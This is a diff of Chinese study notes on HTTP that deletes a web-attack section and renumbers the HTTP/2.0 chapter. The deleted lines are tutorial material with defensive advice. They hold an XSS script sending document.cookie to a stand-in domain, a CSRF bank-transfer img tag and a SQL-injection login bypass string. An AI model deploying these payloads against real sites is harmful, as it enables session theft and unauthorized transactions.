@@ -40,11 +40,11 @@
     * [完整性保护](#完整性保护)
     * [HTTPs 的缺点](#https-的缺点)
     * [配置 HTTPs](#配置-https)
-* [七、Web 攻击技术](#七web-攻击技术)
-    * [跨站脚本攻击](#跨站脚本攻击)
-    * [跨站请求伪造](#跨站请求伪造)
-    * [SQL 注入攻击](#sql-注入攻击)
-    * [拒绝服务攻击](#拒绝服务攻击)
+* [七、HTTP/2.0](#七http20)
+    * [HTTP/1.x 缺陷](#http1x-缺陷)
+    * [二进制分帧层](#二进制分帧层)
+    * [服务端推送](#服务端推送)
+    * [首部压缩](#首部压缩)
 * [八、GET 和 POST 的区别](#八get-和-post-的区别)
     * [作用](#作用)
     * [参数](#参数)
@@ -53,11 +53,6 @@
     * [可缓存](#可缓存)
     * [XMLHttpRequest](#xmlhttprequest)
 * [九、HTTP/1.0 与 HTTP/1.1 的区别](#九http10-与-http11-的区别)
-* [十、HTTP/2.0](#十http20)
-    * [HTTP/1.x 缺陷](#http1x-缺陷)
-    * [二进制分帧层](#二进制分帧层)
-    * [服务端推送](#服务端推送)
-    * [首部压缩](#首部压缩)
 * [参考资料](#参考资料)
 <!-- GFM-TOC -->
 
@@ -716,213 +711,37 @@ HTTPs 的报文摘要功能之所以安全，是因为它结合了加密和认�
 
 [Nginx 配置 HTTPS 服务器](https://aotu.io/notes/2016/08/16/nginx-https/index.html)
 
-# 七、Web 攻击技术
+# 七、HTTP/2.0
 
-## 跨站脚本攻击
+## HTTP/1.x 缺陷
 
-### 1. 概念
+ HTTP/1.x 实现简单是以牺牲应用性能为代价的：
 
-跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
+- 客户端需要使用多个连接才能实现并发和缩短延迟；
+- 不会压缩请求和响应首部，从而导致不必要的网络流量；
+- 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。
 
-例如有一个论坛网站，攻击者可以在上面发布以下内容：
+## 二进制分帧层
 
-```html
-<script>location.href="//domain.com/?c=" + document.cookie</script>
-```
+HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。
 
-之后该内容可能会被渲染成以下形式：
+<div align="center"> <img src="../pics//86e6a91d-a285-447a-9345-c5484b8d0c47.png" width="400"/> </div><br>
 
-```html
-<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
-```
+在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。一个数据流都有一个唯一标识符和可选的优先级信息，用于承载双向信息。消息（Message）是与逻辑请求或响应消息对应的完整的一系列帧。帧（Fram）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。
 
-另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
+<div align="center"> <img src="../pics//af198da1-2480-4043-b07f-a3b91a88b815.png" width="600"/> </div><br>
 
-### 2. 危害
+## 服务端推送
 
-- 窃取用户的 Cookie 值
-- 伪造虚假的输入表单骗取个人信息
-- 显示伪造的文章或者图片
+HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。
 
-### 3. 防范手段
+<div align="center"> <img src="../pics//e3f1657c-80fc-4dfa-9643-bf51abd201c6.png" width="800"/> </div><br>
 
-**（一）设置 Cookie 为 HttpOnly** 
+## 首部压缩
 
-设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
+HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。
 
-**（二）过滤特殊字符** 
-
-例如将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Jascript 代码的运行。
-
-**（三）富文本编辑器的处理** 
-
-富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。
-
-富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。
-
-以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。
-
-[XSS 过滤在线测试](http://jsxss.com/zh/try.html)
-
-```html
-<h1 id="title">XSS Demo</h1>
-
-<p class="text-center">
-Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.
-</p>
-
-<form>
-  <input type="text" name="q" value="test">
-  <button id="submit">Submit</button>
-</form>
-
-<pre>hello</pre>
-
-<p>
-  <a href="http://jsxss.com">http</a>
-</p>
-
-<h3>Features:</h3>
-<ul>
-  <li>Specifies HTML tags and their attributes allowed with whitelist</li>
-  <li>Handle any tags or attributes using custom function</li>
-</ul>
-
-<script type="text/javascript">
-alert(/xss/);
-</script>
-```
-
-```html
-<h1>XSS Demo</h1>
-
-<p>
-Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.
-</p>
-
-&lt;form&gt;
-  &lt;input type="text" name="q" value="test"&gt;
-  &lt;button id="submit"&gt;Submit&lt;/button&gt;
-&lt;/form&gt;
-
-<pre>hello</pre>
-
-<p>
-  <a href="http://jsxss.com">http</a>
-</p>
-
-<h3>Features:</h3>
-<ul>
-  <li>Specifies HTML tags and their attributes allowed with whitelist</li>
-  <li>Handle any tags or attributes using custom function</li>
-</ul>
-
-&lt;script type="text/javascript"&gt;
-alert(/xss/);
-&lt;/script&gt;
-```
-
-## 跨站请求伪造
-
-### 1. 概念
-
-跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。
-
-XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。
-
-假如一家银行用以执行转账操作的 URL 地址如下：
-
-```
-http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
-```
-
-那么，一个恶意攻击者可以在另一个网站上放置如下代码：
-
-```
-<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
-```
-
-如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。
-
-这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
-
-透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
-
-### 2. 防范手段
-
-**（一）检查 Referer 首部字段** 
-
-Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 XSRF 攻击。
-
-这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
-
-**（二）添加校验 Token** 
-
-在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。
-
-**（三）输入验证码** 
-
-因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。
-
-也可以要求用户输入验证码来进行校验。
-
-## SQL 注入攻击
-
-### 1. 概念
-
-服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。
-
-### 2. 攻击原理
-
-例如一个网站登录验证的 SQL 查询代码为：
-
-```sql
-strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
-```
-
-如果填入以下内容：
-
-```sql
-userName = "1' OR '1'='1";
-passWord = "1' OR '1'='1";
-```
-
-那么 SQL 查询字符串为：
-
-```sql
-strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
-```
-
-此时无需验证通过就能执行以下查询：
-
-```sql
-strSQL = "SELECT * FROM users;"
-```
-
-### 3. 防范手段
-
-**（一）使用参数化查询** 
-
-以下以 Java 中的 PreparedStatement 为例，它是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。
-
-```java
-PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
-stmt.setString(1, userid);
-stmt.setString(2, password);
-ResultSet rs = stmt.executeQuery();
-```
-
-**（二）单引号转换** 
-
-将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。
-
-## 拒绝服务攻击
-
-拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。
-
-分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。
-
-> [维基百科：拒绝服务攻击](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
+<div align="center"> <img src="../pics//_u4E0B_u8F7D.png" width="600"/> </div><br>
 
 # 八、GET 和 POST 的区别
 
@@ -1021,37 +840,6 @@ DELETE /idX/delete HTTP/1.1   -> Returns 404
 
 - HTTP/1.1 新增缓存处理指令 max-age
 
-# 十、HTTP/2.0
-
-## HTTP/1.x 缺陷
-
- HTTP/1.x 实现简单是以牺牲应用性能为代价的：
-
-- 客户端需要使用多个连接才能实现并发和缩短延迟；
-- 不会压缩请求和响应首部，从而导致不必要的网络流量；
-- 不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。
-
-## 二进制分帧层
-
-HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。
-
-<div align="center"> <img src="../pics//86e6a91d-a285-447a-9345-c5484b8d0c47.png" width="400"/> </div><br>
-
-在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。一个数据流都有一个唯一标识符和可选的优先级信息，用于承载双向信息。消息（Message）是与逻辑请求或响应消息对应的完整的一系列帧。帧（Fram）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。
-
-<div align="center"> <img src="../pics//af198da1-2480-4043-b07f-a3b91a88b815.png" width="600"/> </div><br>
-
-## 服务端推送
-
-HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。
-
-<div align="center"> <img src="../pics//e3f1657c-80fc-4dfa-9643-bf51abd201c6.png" width="800"/> </div><br>
-
-## 首部压缩
-
-HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。
-
-<div align="center"> <img src="../pics//_u4E0B_u8F7D.png" width="600"/> </div><br>
 
 # 参考资料
 
@@ -1075,10 +863,6 @@ HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0
 - [COOKIE 和 SESSION 有什么区别](https://www.zhihu.com/question/19786827)
 - [Cookie/Session 的机制与安全](https://harttle.land/2015/08/10/cookie-session.html)
 - [HTTPS 证书原理](https://shijianan.com/2017/06/11/https/)
-- [维基百科：跨站脚本](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC)
-- [维基百科：SQL 注入攻击](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
-- [维基百科：跨站点请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
-- [维基百科：拒绝服务攻击](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
 - [What is the difference between a URI, a URL and a URN?](https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn)
 - [XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)
 - [XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?](https://blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/)
